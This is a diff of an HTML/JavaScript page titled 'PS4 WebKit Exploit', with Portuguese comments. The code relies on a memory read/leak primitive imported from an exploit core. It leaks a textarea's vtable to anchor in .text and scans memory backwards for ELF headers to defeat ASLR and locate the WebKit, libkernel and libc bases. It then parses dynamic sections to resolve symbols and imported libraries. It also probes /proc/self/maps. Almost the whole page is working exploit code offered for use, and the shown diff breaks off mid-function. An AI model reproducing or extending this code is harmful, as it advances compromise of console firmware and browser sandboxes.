@@ -1,714 +1,549 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit</title>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body {
-  background: #0a0a0f; color: #e0e0e0;
-  font-family: 'Courier New', monospace;
-  min-height: 100vh; display: flex; flex-direction: column;
-  align-items: center; padding: 20px;
-}
-h1 { font-size: 18px; color: #00c8ff; letter-spacing: 4px;
-  text-transform: uppercase; margin-bottom: 6px; text-align: center; }
-#fw-label { font-size: 11px; color: #666; margin-bottom: 18px;
-  text-align: center; letter-spacing: 2px; }
-
-/* status bar */
-#status-bar {
-  width: 100%; max-width: 700px; background: #111118;
-  border: 1px solid #1e1e2e; border-radius: 6px;
-  padding: 12px 16px; margin-bottom: 12px;
-  display: flex; align-items: center; gap: 10px;
-}
-#status-dot { width: 10px; height: 10px; border-radius: 50%;
-  background: #444; flex-shrink: 0; transition: background 0.3s; }
-#status-dot.running { background: #f0a500; animation: pulse 1s infinite; }
-#status-dot.ok      { background: #00c853; }
-#status-dot.error   { background: #ff3d3d; }
-@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-#status-text { font-size: 13px; color: #ccc; flex: 1; }
-
-#attempt-bar {
-  width: 100%; max-width: 700px;
-  display: flex; justify-content: space-between;
-  font-size: 11px; color: #444; margin-bottom: 12px; padding: 0 2px;
-}
-
-/* console */
-#console {
-  width: 100%; max-width: 700px; height: 380px;
-  background: #06060c; border: 1px solid #1a1a2e;
-  border-radius: 6px; overflow-y: auto;
-  padding: 10px 12px; font-size: 12px; line-height: 1.6; margin-bottom: 12px;
-}
-.log-line { padding: 1px 0; word-break: break-all; }
-.log-info    { color: #7ec8e3; }
-.log-ok      { color: #00c853; font-weight: bold; }
-.log-warn    { color: #f0a500; }
-.log-error   { color: #ff5252; font-weight: bold; }
-.log-dim     { color: #444; }
-.log-addr    { color: #bd93f9; }
-.log-section { color: #00c8ff; border-top: 1px solid #1a1a2e;
-  margin-top: 6px; padding-top: 6px; letter-spacing: 1px; }
-.log-found   { color: #a78bfa; font-weight: bold; }
-
-/* bases grid */
-#bases-grid {
-  width: 100%; max-width: 700px;
-  display: none; grid-template-columns: 1fr 1fr;
-  gap: 8px; margin-bottom: 12px;
-}
-#bases-grid.visible { display: grid; }
-.base-card {
-  background: #0d0d1a; border: 1px solid #1e1e3a;
-  border-radius: 6px; padding: 10px 14px;
-}
-.base-card .label { font-size: 10px; color: #555;
-  text-transform: uppercase; letter-spacing: 2px; margin-bottom: 4px; }
-.base-card .value { font-size: 13px; color: #bd93f9; word-break: break-all; }
-.base-card .value.na { color: #333; }
-
-/* constants box */
-#constants-box {
-  width: 100%; max-width: 700px;
-  background: #060f06; border: 2px solid #00c853;
-  border-radius: 6px; padding: 14px;
-  display: none; margin-bottom: 12px;
-  font-size: 12px; line-height: 1.8; color: #4ade80;
-}
-#constants-box .c-title {
-  color: #fff; font-weight: bold; margin-bottom: 8px;
-  border-bottom: 1px solid #1a3a1a; padding-bottom: 4px;
-}
-#constants-box .c-dim { color: #555; }
-#constants-box .c-val { color: #bd93f9; }
-
-/* libs list */
-#libs-list {
-  width: 100%; max-width: 700px;
-  display: none; flex-direction: column; gap: 6px; margin-bottom: 12px;
-}
-#libs-list.visible { display: flex; }
-.lib-row {
-  background: #0d0d1a; border: 1px solid #1a1a2e;
-  border-radius: 4px; padding: 8px 12px;
-  display: flex; justify-content: space-between; font-size: 12px;
-}
-.lib-row .lib-name { color: #8be9fd; }
-.lib-row .lib-base { color: #bd93f9; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 WebKit Exploit</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0f; color: #e0e0e0;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh; display: flex;
+            flex-direction: column; align-items: center; padding: 20px;
+        }
+        h1 { font-size: 18px; color: #00c8ff; letter-spacing: 4px;
+             text-transform: uppercase; margin-bottom: 6px; text-align: center; }
+        #fw-label { font-size: 11px; color: #666; margin-bottom: 18px;
+                    text-align: center; letter-spacing: 2px; }
+        #status-bar { width: 100%; max-width: 700px; background: #111118;
+            border: 1px solid #1e1e2e; border-radius: 6px;
+            padding: 12px 16px; margin-bottom: 12px;
+            display: flex; align-items: center; gap: 10px; }
+        #status-dot { width: 10px; height: 10px; border-radius: 50%;
+            background: #444; flex-shrink: 0; transition: background 0.3s; }
+        #status-dot.running { background: #f0a500; animation: pulse 1s infinite; }
+        #status-dot.ok      { background: #00c853; }
+        #status-dot.error   { background: #ff3d3d; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+        #status-text { font-size: 13px; color: #ccc; flex: 1; }
+        #attempt-bar { width: 100%; max-width: 700px; display: flex;
+            justify-content: space-between; font-size: 11px; color: #444;
+            margin-bottom: 12px; padding: 0 2px; }
+        #console { width: 100%; max-width: 700px; height: 420px;
+            background: #06060c; border: 1px solid #1a1a2e; border-radius: 6px;
+            overflow-y: auto; padding: 10px 12px; font-size: 12px;
+            line-height: 1.6; margin-bottom: 12px; }
+        .log-line   { padding: 1px 0; word-break: break-all; }
+        .log-info   { color: #7ec8e3; }
+        .log-ok     { color: #00c853; font-weight: bold; }
+        .log-warn   { color: #f0a500; }
+        .log-error  { color: #ff5252; font-weight: bold; }
+        .log-dim    { color: #555; }
+        .log-addr   { color: #bd93f9; }
+        .log-section{ color: #00c8ff; border-top: 1px solid #1a1a2e;
+                      margin-top: 6px; padding-top: 6px; letter-spacing: 1px; }
+        #bases-grid { width: 100%; max-width: 700px; display: none;
+            grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
+        #bases-grid.visible { display: grid; }
+        .base-card  { background: #0d0d1a; border: 1px solid #1e1e3a;
+                      border-radius: 6px; padding: 10px 14px; }
+        .base-card .label { font-size: 10px; color: #555;
+            text-transform: uppercase; letter-spacing: 2px; margin-bottom: 4px; }
+        .base-card .value { font-size: 13px; color: #bd93f9; word-break: break-all; }
+        .base-card .value.na { color: #333; }
+        #libs-list  { width: 100%; max-width: 700px; display: none;
+            flex-direction: column; gap: 6px; margin-bottom: 12px; }
+        #libs-list.visible { display: flex; }
+        .lib-row    { background: #0d0d1a; border: 1px solid #1a1a2e;
+            border-radius: 4px; padding: 8px 12px;
+            display: flex; justify-content: space-between; font-size: 12px; }
+        .lib-row .lib-name { color: #8be9fd; }
+        .lib-row .lib-base { color: #bd93f9; }
+    </style>
 </head>
 <body>
 
 <h1>PS4 WebKit Exploit</h1>
 <div id="fw-label">aguardando firmware...</div>
-
 <div id="status-bar">
-  <div id="status-dot"></div>
-  <div id="status-text">Inicializando...</div>
+    <div id="status-dot"></div>
+    <div id="status-text">Inicializando...</div>
 </div>
 <div id="attempt-bar">
-  <span id="attempt-text">tentativa: —</span>
-  <span id="stage-text">estágio: —</span>
+    <span id="attempt-text">tentativa: —</span>
+    <span id="stage-text">estágio: —</span>
 </div>
-
 <div id="console"></div>
-
 <div id="bases-grid">
-  <div class="base-card">
-    <div class="label">WebKit Base</div>
-    <div class="value na" id="card-webkit">—</div>
-  </div>
-  <div class="base-card">
-    <div class="label">libkernel Base</div>
-    <div class="value na" id="card-kernel">—</div>
-  </div>
-  <div class="base-card">
-    <div class="label">libc Base</div>
-    <div class="value na" id="card-libc">—</div>
-  </div>
-  <div class="base-card">
-    <div class="label">__ps5NativeCtor</div>
-    <div class="value na" id="card-ctor">—</div>
-  </div>
+    <div class="base-card"><div class="label">WebKit Base</div>
+        <div class="value na" id="card-webkit">—</div></div>
+    <div class="base-card"><div class="label">libkernel Base</div>
+        <div class="value na" id="card-kernel">—</div></div>
+    <div class="base-card"><div class="label">libc Base</div>
+        <div class="value na" id="card-libc">—</div></div>
+    <div class="base-card"><div class="label">Âncora .text</div>
+        <div class="value na" id="card-ctor">—</div></div>
 </div>
-
-<!-- Constants box — populated after base is found -->
-<div id="constants-box">
-  <div class="c-title">// ═══ PS4 FW 13.50 — HARDCODE CONSTANTS ═══</div>
-  <div id="c-lines"></div>
-  <div class="c-dim" style="margin-top:8px">
-    // Copie estes valores para eliminar o scan em próximas execuções:
-  </div>
-  <div id="c-usage"></div>
-</div>
-
 <div id="libs-list"></div>
 
+<!-- =============================================================
+     IMPORTS — usa o mesmo ?v=10 do mem.js para evitar módulo duplo
+     FIX #1: export correto é startCore, não establishPrimitive
+     ============================================================= -->
 <script type="module">
-import { int64 }             from './resources/int64.js';
-import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP }    from './resources/mem.js';
 
+import { int64 }          from './resources/int64.js';
+import { installWindowP } from './resources/mem.js';
+
+// FIX #1 — tenta startCore (original) e establishPrimitive (alias que você pode ter adicionado)
+// Importa ambos, usa o que existir
+let startFn;
+try {
+    const m = await import('./resources/core.js?v=10');
+    startFn = m.startCore ?? m.establishPrimitive ?? m.start ?? null;
+    if (!startFn) throw new Error('Nenhum export de inicialização encontrado no core.js. ' +
+        'Procure por: export function startCore / export function establishPrimitive');
+} catch (err) {
+    document.getElementById('status-text').textContent = 'ERRO IMPORT: ' + err.message;
+    document.getElementById('status-dot').className = 'error';
+    throw err;
+}
+
+// int64 global — mem.js e qualquer outro módulo precisam disso
 globalThis.int64 = int64;
 
-/* ─── UI helpers ─────────────────────────────────────────── */
-const $con     = document.getElementById('console');
-const $dot     = document.getElementById('status-dot');
-const $stTxt   = document.getElementById('status-text');
-const $atTxt   = document.getElementById('attempt-text');
-const $stgTxt  = document.getElementById('stage-text');
-const $fwLabel = document.getElementById('fw-label');
-const $bases   = document.getElementById('bases-grid');
-const $libs    = document.getElementById('libs-list');
-const $cbox    = document.getElementById('constants-box');
+// ─── UI ──────────────────────────────────────────────────────────────────────
+const $con      = document.getElementById('console');
+const $dot      = document.getElementById('status-dot');
+const $stTxt    = document.getElementById('status-text');
+const $attTxt   = document.getElementById('attempt-text');
+const $stageTxt = document.getElementById('stage-text');
+const $fwLbl    = document.getElementById('fw-label');
+const $grid     = document.getElementById('bases-grid');
+const $libs     = document.getElementById('libs-list');
 
 function log(msg, cls = 'log-info') {
-  const el = document.createElement('div');
-  el.className = 'log-line ' + cls;
-  el.textContent = msg;
-  $con.appendChild(el);
-  $con.scrollTop = $con.scrollHeight;
-  while ($con.children.length > 500) $con.removeChild($con.firstChild);
+    const el = document.createElement('div');
+    el.className = 'log-line ' + cls;
+    el.textContent = msg;
+    $con.appendChild(el);
+    $con.scrollTop = $con.scrollHeight;
 }
-
-function setStatus(msg, state = 'running') {
-  $stTxt.textContent = msg;
-  $dot.className = state;
+function setStatus(msg, st = 'running') {
+    $stTxt.textContent = msg; $dot.className = st;
 }
-
-function setCard(id, value) {
-  const el = document.getElementById(id);
-  if (!el) return;
-  el.textContent = value;
-  el.classList.remove('na');
+function setCard(id, v) {
+    const el = document.getElementById(id);
+    if (el) { el.textContent = v; el.classList.remove('na'); }
 }
-
 function addLibRow(name, base) {
-  const row = document.createElement('div');
-  row.className = 'lib-row';
-  row.innerHTML = `<span class="lib-name">${name}</span>`
-                + `<span class="lib-base">0x${base}</span>`;
-  $libs.appendChild(row);
-  $libs.classList.add('visible');
+    const row = document.createElement('div');
+    row.className = 'lib-row';
+    row.innerHTML = `<span class="lib-name">${name}</span>`+
+                    `<span class="lib-base">0x${base}</span>`;
+    $libs.appendChild(row);
+    $libs.classList.add('visible');
 }
+function yield_() { return new Promise(r => setTimeout(r, 0)); }
 
-/* ─── firmware detect ────────────────────────────────────── */
+// ─── firmware ────────────────────────────────────────────────────────────────
 const ua = navigator.userAgent;
-const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua)
-             || /PlayStation 5\/(\d+\.\d+)/.exec(ua);
-const fwStr = fwMatch ? fwMatch[1] : '';
-$fwLabel.textContent = fwStr
-  ? `PlayStation — firmware ${fwStr}`
-  : `UA: ${ua.slice(0, 60)}`;
+const fwM = /PlayStation (?:4|5)\/(\d+\.\d+)/.exec(ua);
+const fwStr = fwM ? fwM[1] : '';
+$fwLbl.textContent = fwStr ? `PlayStation — firmware ${fwStr}` : ua.slice(0,80);
 
-/* ─── int64 helpers ──────────────────────────────────────── */
-function i64n(a) { return a.hi * 0x100000000 + a.low; }
-function numToI64(n) {
-  const hi = Math.floor(n / 0x100000000) >>> 0;
-  const lo = (n - hi * 0x100000000) >>> 0;
-  return new int64(lo, hi);
-}
-function alignDown(a, align) {
-  return new int64((a.low & ~(align - 1)) >>> 0, a.hi);
-}
-function isValidPtr(a) {
-  return a.hi > 0 && a.hi <= 0xFF && a.low > 0;
-}
-function read2(p, addr) {
-  // read2 can be absent in some mem.js builds — fallback via read4
-  if (typeof p.read2 === 'function') return p.read2(addr);
-  return p.read4(addr) & 0xFFFF;
-}
-function readStr(p, addr, maxLen = 128) {
-  let s = '';
-  for (let i = 0; i < maxLen; i++) {
-    const c = p.read1(addr.add32(i));
-    if (c === 0) break;
-    s += String.fromCharCode(c);
-  }
-  return s;
-}
-
-/* ─── FASE 1: /proc/self/maps ────────────────────────────── */
-async function tryProcMaps() {
-  for (const url of ['file:///proc/self/maps', 'file:///proc/self/smaps']) {
-    try {
-      const r = await fetch(url);
-      const txt = await r.text();
-      if (txt && txt.length > 50) {
-        log('[+] /proc/self/maps acessível!', 'log-ok');
-        log(txt.slice(0, 3000), 'log-dim');
-        return txt;
-      }
-    } catch(_) {}
-  }
-  log('[-] /proc/self/maps bloqueado (sandbox ativo)', 'log-warn');
-  return null;
-}
-
-/* ─── FASE 2: ponteiro inicial (nativeCtor do core.js) ──── */
-function getWebKitPointer(p) {
-  const ctor = globalThis.__ps5NativeCtor;
-  if (typeof ctor === 'number' && ctor > 0x100000000) {
-    const ptr = numToI64(ctor);
-    log('[+] __ps5NativeCtor: 0x' + ptr.toString(), 'log-addr');
-    setCard('card-ctor', '0x' + ptr.toString());
-    return ptr;
-  }
-  log('[-] __ps5NativeCtor não disponível', 'log-warn');
-  return null;
-}
-
-/* ─── FASE 2.5: âncora em .text via vtable ───────────────
-   CRÍTICO: o __ps5NativeCtor no PS4 pode apontar para .data
-   (segmento separado). Usar ele diretamente no scan → SIGSEGV
-   no primeiro gap entre segmentos.
-
-   Solução: ler vtable da textarea (offset 0x10 no PS4) e
-   usar os slots (function pointers em .text) como âncora.
-   Esses ponteiros são GARANTIDAMENTE em .text — sem gaps.
-──────────────────────────────────────────────────────────── */
-function getTextAnchor(p) {
-  log('[*] Lendo vtable da textarea para âncora em .text...', 'log-info');
-
-  const ta = document.createElement('textarea');
-  const obj = p.leakval(ta);
-  log('  textarea JSCell @ 0x' + obj.toString(), 'log-dim');
-
-  // Offset 0x10 confirmado no PS4 para vtable pointer
-  const vt = p.read8(obj.add32(0x10));
-  if (!isValidPtr(vt)) {
-    log('  [-] vtable em 0x10 inválida: 0x' + vt.toString(), 'log-warn');
-    return null;
-  }
-  log('  vtable @ 0x' + vt.toString(), 'log-dim');
-
-  // Coleta todos os slots da vtable (function ptrs em .text)
-  let minFnAddr = null;
-  let minFnNum  = Infinity;
-  const vtN = i64n(vt);
-
-  for (let i = 0; i < 64; i++) {
-    try {
-      const slot = p.read8(vt.add32(i * 8));
-      const n = i64n(slot);
-      // Ponteiro em .text: válido, não-page-aligned, ABAIXO da vtable
-      // (vtable fica em .rodata que é ACIMA de .text no layout do PS4)
-      if (!isValidPtr(slot)) continue;
-      if ((n & 0xFFF) === 0) continue;  // page-aligned = provavelmente outra vtable
-      if (n >= vtN) continue;            // acima da vtable = não é .text neste layout
-      if (n < minFnNum) {
-        minFnNum  = n;
-        minFnAddr = slot;
-      }
-    } catch(_) {}
-  }
-
-  if (!minFnAddr) {
-    log('  [-] Nenhum fn ptr válido em slots da vtable', 'log-warn');
-    return null;
-  }
-
-  log('[+] Âncora .text (min vtable slot): 0x' + minFnAddr.toString(), 'log-ok');
-  log('  Distância vtable→anchor: '
-    + ((vtN - minFnNum) / 1024 / 1024).toFixed(1) + ' MB', 'log-dim');
-  return minFnAddr;
-}
-
-/* ─── FASE 3: ELF scan (limitado e seguro) ───────────────
-   USA âncora em .text — nunca cruza gaps de segmento.
-   Passo: 0x1000 (4 KB) — não perde bases misalinhadas.
-   Limite: 15 MB — ancora está ~10 MB acima da base.
-──────────────────────────────────────────────────────────── */
-async function findElfBase(p, anchor, label) {
-  const PAGE   = 0x1000;
-  const MAX_MB = 15;
-  const MAX_PG = (MAX_MB * 1024 * 1024) / PAGE;  // 3840 iterações
-
-  log('[*] Scan ELF (' + label + '): '
-    + MAX_MB + ' MB · passo 0x1000 · âncora 0x' + anchor.toString(), 'log-info');
-
-  let base = alignDown(anchor, PAGE);
-
-  for (let i = 0; i < MAX_PG; i++) {
-    if (base.hi === 0 && base.low < PAGE) break;
-
-    // Yield a cada 256 páginas (1 MB)
-    if (i % 256 === 0) {
-      const mb = (i * PAGE / 1024 / 1024).toFixed(1);
-      setStatus('Scan ' + label + ': ' + mb + ' MB — 0x' + base.toString(), 'running');
-      $stgTxt.textContent = 'elf-scan: -' + mb + 'MB';
-      await new Promise(r => setTimeout(r, 0));
+// ─── helpers de memória ───────────────────────────────────────────────────────
+function readStr(p, addr, max = 128) {
+    let s = '';
+    for (let i = 0; i < max; i++) {
+        const c = p.read1(addr.add32(i));
+        if (!c) break;
+        s += String.fromCharCode(c);
     }
-
-    let magic;
-    try {
-      magic = p.read4(base) >>> 0;
-    } catch(_) {
-      // Página não mapeada — estamos abaixo do módulo
-      log('  [!] página não mapeada @ 0x' + base.toString()
-        + ' — limite do módulo atingido', 'log-warn');
-      break;
-    }
-
-    if (magic === 0x464C457F) {
-      // Confirma: ELF64 little-endian
-      let cls = 0, enc = 0;
-      try { cls = p.read1(base.add32(4)); enc = p.read1(base.add32(5)); }
-      catch(_) { base = base.sub32(PAGE); continue; }
-
-      if (cls === 2 && enc === 1) {
-        log('[+] ' + label + ' base: 0x' + base.toString()
-          + ' (' + i + ' × 0x1000 atrás)', 'log-ok');
-        return base;
-      }
-    }
-
-    base = base.sub32(PAGE);
-  }
-
-  log('[-] ELF base de "' + label + '" não encontrada em ' + MAX_MB + ' MB', 'log-warn');
-  return null;
+    return s;
 }
 
-/* ─── Parse PT_DYNAMIC ───────────────────────────────────── */
-function parseDynamic(p, elfBase) {
-  let e_phoff, e_phentsize, e_phnum;
-  try {
-    e_phoff     = p.read8(elfBase.add32(0x20)).low;
-    e_phentsize = read2(p, elfBase.add32(0x36));
-    e_phnum     = read2(p, elfBase.add32(0x38));
-  } catch(_) { return null; }
-
-  let dynOff = null, dynSz = 0;
-  for (let i = 0; i < e_phnum && i < 32; i++) {
-    try {
-      const ph = elfBase.add32(e_phoff + i * e_phentsize);
-      if ((p.read4(ph) >>> 0) === 2 /* PT_DYNAMIC */) {
-        dynOff = p.read8(ph.add32(0x08)).low;   // p_offset
-        dynSz  = p.read8(ph.add32(0x20)).low;   // p_filesz
-        break;
-      }
-    } catch(_) {}
-  }
-  if (dynOff === null) return null;
-
-  const dynAddr = elfBase.add32(dynOff);
-  const r = {
-    strtab: null, symtab: null, syment: 0x18,
-    pltgot: null, jmprel: null, pltrelsz: 0, soname: ''
-  };
-  const maxEnt = Math.min(Math.floor(dynSz / 0x10), 512);
-  for (let i = 0; i < maxEnt; i++) {
-    try {
-      const e   = dynAddr.add32(i * 0x10);
-      const tag = p.read8(e).low;
-      const val = p.read8(e.add32(8));
-      if (tag === 0) break;
-      if (tag ===  5) r.strtab   = val;
-      if (tag ===  6) r.symtab   = val;
-      if (tag === 11) r.syment   = val.low;
-      if (tag ===  3) r.pltgot   = val;
-      if (tag === 23) r.jmprel   = val;
-      if (tag ===  2) r.pltrelsz = val.low;
-      if (tag === 14 && r.strtab) {
-        try { r.soname = readStr(p, r.strtab.add32(val.low)); }
-        catch(_) { r.soname = '<NID>'; }
-      }
-    } catch(_) {}
-  }
-  return r;
-}
-
-/* ─── Find symbol by name ────────────────────────────────── */
-function findSymbol(p, elfBase, dyn, name) {
-  if (!dyn || !dyn.symtab || !dyn.strtab) return null;
-  for (let i = 0; i < 4096; i++) {
-    try {
-      const sym    = dyn.symtab.add32(i * dyn.syment);
-      const stName = p.read4(sym) >>> 0;
-      if (stName === 0) continue;
-      if (readStr(p, dyn.strtab.add32(stName)) === name)
-        return elfBase.add32(p.read8(sym.add32(8)).low);
-    } catch(_) {}
-  }
-  return null;
-}
-
-/* ─── Discover imports via GOT ───────────────────────────── */
-async function discoverImports(p, dyn, ownerLabel) {
-  if (!dyn || !dyn.pltgot) return [];
-  const slots = dyn.pltrelsz ? Math.floor(dyn.pltrelsz / 0x18) + 3 : 128;
-  const seen  = new Map();
-
-  for (let i = 3; i < slots; i++) {
-    let slot;
-    try { slot = p.read8(dyn.pltgot.add32(i * 8)); }
-    catch(_) { continue; }
-
-    if (!isValidPtr(slot) || (slot.low & 3) !== 0) continue;
-
-    // Usa scan de 8 MB para libs importadas (mais rápido — elas têm base menor)
-    const PAGE = 0x1000;
-    const MAX_PG = (8 * 1024 * 1024) / PAGE;
-    let cur = alignDown(slot, PAGE);
-    let libBase = null;
-
-    for (let j = 0; j < MAX_PG; j++) {
-      if (!isValidPtr(cur)) break;
-      let m;
-      try { m = p.read4(cur) >>> 0; }
-      catch(_) { break; }
-      if (m === 0x464C457F) {
+// ─── /proc/self/maps ─────────────────────────────────────────────────────────
+async function tryMaps() {
+    for (const u of ['file:///proc/self/maps','file:///proc/self/smaps']) {
         try {
-          if (p.read1(cur.add32(4)) === 2 && p.read1(cur.add32(5)) === 1) {
-            libBase = cur; break;
-          }
+            const r = await fetch(u);
+            const t = await r.text();
+            if (t.length > 50) {
+                log('[+] /proc/self/maps ok!', 'log-ok');
+                log(t.slice(0,3000), 'log-dim');
+                return t;
+            }
+        } catch(_){}
+    }
+    log('[-] /proc/self/maps: sandbox ativo', 'log-warn');
+    return null;
+}
+
+// ─── FASE 2.5 — âncora segura via vtable da textarea ─────────────────────────
+// Lê todos os slots do vtable e escolhe o MÍNIMO (mais próximo da base .text)
+// Isso evita usar __ps5NativeCtor que às vezes aponta para região não-mapeada
+function getTextAnchor(p, wkCtorPtr) {
+    // Estratégia 1: usar __ps5NativeCtor do core.js
+    let ctor = null;
+    const raw = globalThis.__ps5NativeCtor;
+    if (typeof raw === 'number' && raw > 0x100000000) {
+        const hi = Math.floor(raw / 0x100000000);
+        const lo = (raw - hi * 0x100000000) >>> 0;
+        ctor = new int64(lo, hi >>> 0);
+        log('[+] __ps5NativeCtor: 0x' + ctor.toString(), 'log-addr');
+        setCard('card-ctor', '0x' + ctor.toString());
+    }
+
+    // Estratégia 2: varrer vtable da textarea para achar anchor menor (mais perto da base)
+    log('[*] Lendo vtable da textarea para âncora em .text...', 'log-dim');
+    let anchor = ctor;
+    try {
+        const el    = document.createElement('textarea');
+        const cell  = p.leakval(el);
+        const cppObj = p.read8(cell.add32(0x18));
+        const vtable = p.read8(cppObj);
+        log(`  textarea JSCell @ 0x${cell.toString()}`, 'log-dim');
+        log(`  vtable @ 0x${vtable.toString()}`, 'log-dim');
+
+        // Lê 64 slots e pega o menor endereço válido (aponta para .text)
+        // endereço válido: hi == 8 (range do user-space PS4) e baixa metade razoável
+        let minAddr = null;
+        for (let i = 0; i < 64; i++) {
+            let slot;
+            try { slot = p.read8(vtable.add32(i * 8)); } catch(_) { break; }
+            // Filtra ponteiros que parecem ser de .text no PS4: hi = 0x8 ou 0x7
+            if (slot.hi === 0 || slot.hi > 0xFFFF) continue;
+            if (!minAddr || slot.hi < minAddr.hi ||
+                (slot.hi === minAddr.hi && slot.low < minAddr.low)) {
+                minAddr = slot;
+            }
+        }
+        if (minAddr) {
+            log(`[+] Âncora .text (min vtable slot): 0x${minAddr.toString()}`, 'log-ok');
+            // Calcula distância vtable→anchor para debug
+            const diffLo = vtable.low - minAddr.low;
+            const diffMB = Math.abs(diffLo) / (1024*1024);
+            log(`  Distância vtable→anchor: ${diffMB.toFixed(1)} MB`, 'log-dim');
+
+            // Prefere a âncora vtable se for MENOR que o ctor (mais próxima da base)
+            if (!anchor || minAddr.hi < anchor.hi ||
+                (minAddr.hi === anchor.hi && minAddr.low < anchor.low)) {
+                log('[!] Usando âncora vtable (menor = mais próxima da base .text)', 'log-warn');
+                anchor = minAddr;
+            }
+        }
+    } catch(e) {
+        log('[-] Falha ao ler vtable: ' + e.message, 'log-warn');
+    }
+
+    return anchor;
+}
+
+// ─── ELF scan em 2 estágios (FIX #3: era O(253k), agora O(~1000)) ──────────
+//
+// Stage 1 — passo 0x200000 (2 MB): cobre até 990 MB em ~495 leituras
+// Stage 2 — passo 0x1000   (4 KB): afina nos últimos 2 MB (~512 leituras)
+//
+// Floor seguro: 0x800000000 — mínimo do espaço de usuário do PS4
+// Se bater em página não mapeada, try/catch absorve e pula (FIX #5)
+//
+async function findElfBase(p, anchor, label) {
+    const FLOOR      = new int64(0x00000000, 0x8);   // 0x800000000
+    const STEP_COARSE = 0x200000;   // 2 MB
+    const STEP_FINE   = 0x1000;     // 4 KB
+
+    // ── stage 1: passo grosso ──
+    log(`[*] Scan ELF (${label}): passo 2MB desde 0x${anchor.toString()} até 0x${FLOOR.toString()}`, 'log-dim');
+
+    let coarseHit = null;
+    let cur = new int64(anchor.low & ~(STEP_COARSE-1), anchor.hi);
+
+    let itr = 0;
+    while (cur.hi > FLOOR.hi || (cur.hi === FLOOR.hi && cur.low >= FLOOR.low)) {
+        if (++itr % 32 === 0) {
+            setStatus(`Scan ${label}: -${((anchor.low - cur.low)/1024/1024).toFixed(0)} MB…`, 'running');
+            await yield_();
+        }
+        let magic = 0;
+        try { magic = p.read4(cur); } catch(_) { cur = cur.sub32(STEP_COARSE); continue; }
+
+        if (magic === 0x464C457F) {  // \x7fELF
+            try {
+                if (p.read1(cur.add32(4)) === 2 && p.read1(cur.add32(5)) === 1) {
+                    coarseHit = cur;
+                    log(`[~] ELF achado (stage1) perto de 0x${cur.toString()}`, 'log-warn');
+                    break;
+                }
+            } catch(_) {}
+        }
+        cur = cur.sub32(STEP_COARSE);
+    }
+
+    if (!coarseHit) {
+        log(`[-] Scan grosso não achou ${label}`, 'log-warn');
+        return null;
+    }
+
+    // ── stage 2: afina no bloco de 2 MB ACIMA do hit grosso ──
+    log(`[*] Afinando em torno de 0x${coarseHit.toString()} (passo 4KB)…`, 'log-dim');
+    let fine = new int64(coarseHit.low, coarseHit.hi);
+    // vai até 2 MB acima do hit grosso
+    const ceiling = new int64((coarseHit.low + STEP_COARSE) >>> 0,
+                               coarseHit.hi + ((coarseHit.low + STEP_COARSE < coarseHit.low) ? 1 : 0));
+
+    while (fine.hi < ceiling.hi || (fine.hi === ceiling.hi && fine.low < ceiling.low)) {
+        let magic = 0;
+        try { magic = p.read4(fine); } catch(_) { fine = new int64((fine.low + STEP_FINE)>>>0, fine.hi); continue; }
+
+        if (magic === 0x464C457F) {
+            try {
+                if (p.read1(fine.add32(4)) === 2 && p.read1(fine.add32(5)) === 1) {
+                    log(`[+] ${label} base EXATA: 0x${fine.toString()}`, 'log-ok');
+                    return fine;
+                }
+            } catch(_) {}
+        }
+        fine = new int64((fine.low + STEP_FINE) >>> 0, fine.hi);
+    }
+
+    // fallback: retorna o hit grosso se o fino não encontrou melhor
+    log(`[~] Usando base aproximada (2MB): 0x${coarseHit.toString()}`, 'log-warn');
+    return coarseHit;
+}
+
+// ─── parse DYNAMIC ───────────────────────────────────────────────────────────
+function parseDynamic(p, base) {
+    try {
+        const phoff     = p.read8(base.add32(0x20)).low;
+        const phentsize = p.read2(base.add32(0x36));
+        const phnum     = p.read2(base.add32(0x38));
+        let dynOff = null, dynSz = 0;
+        for (let i = 0; i < phnum; i++) {
+            const ph = base.add32(phoff + i * phentsize);
+            if (p.read4(ph) === 2) { // PT_DYNAMIC
+                dynOff = p.read8(ph.add32(0x08)).low;
+                dynSz  = p.read8(ph.add32(0x20)).low;
+                break;
+            }
+        }
+        if (dynOff === null) return null;
+        const dyn = base.add32(dynOff);
+        const r = { strtab:null, symtab:null, syment:0x18,
+                    pltgot:null, pltrelsz:0, sonameOff:0, soname:'' };
+        const n = Math.min(Math.floor(dynSz/0x10), 512);
+        for (let i = 0; i < n; i++) {
+            const e   = dyn.add32(i*0x10);
+            const tag = p.read8(e).low;
+            const val = p.read8(e.add32(8));
+            if (tag===0) break;
+            if (tag===5)  r.strtab   = val;
+            if (tag===6)  r.symtab   = val;
+            if (tag===11) r.syment   = val.low;
+            if (tag===3)  r.pltgot   = val;
+            if (tag===2)  r.pltrelsz = val.low;
+            if (tag===14) r.sonameOff= val.low;
+            if (tag===23) r.jmprel   = val;
+        }
+        if (r.strtab && r.sonameOff)
+            try { r.soname = readStr(p, r.strtab.add32(r.sonameOff), 64); } catch(_){}
+        return r;
+    } catch(_) { return null; }
+}
+
+// ─── busca símbolo ────────────────────────────────────────────────────────────
+function findSymbol(p, base, dyn, name) {
+    if (!dyn?.symtab || !dyn?.strtab) return null;
+    for (let i = 0; i < 4096; i++) {
+        try {
+            const sym = dyn.symtab.add32(i * dyn.syment);
+            const sn  = p.read4(sym);
+            if (!sn) continue;
+            if (readStr(p, dyn.strtab.add32(sn), 64) === name)
+                return base.add32(p.read8(sym.add32(8)).low);
         } catch(_) {}
-      }
-      cur = cur.sub32(PAGE);
     }
-
-    if (!libBase) continue;
-    const key = libBase.toString();
-    if (!seen.has(key)) {
-      const libDyn  = parseDynamic(p, libBase);
-      const soname  = libDyn?.soname || '<NID>';
-      seen.set(key, { base: libBase, dyn: libDyn, soname });
-      log('  [lib] 0x' + key + '  ' + soname, 'log-addr');
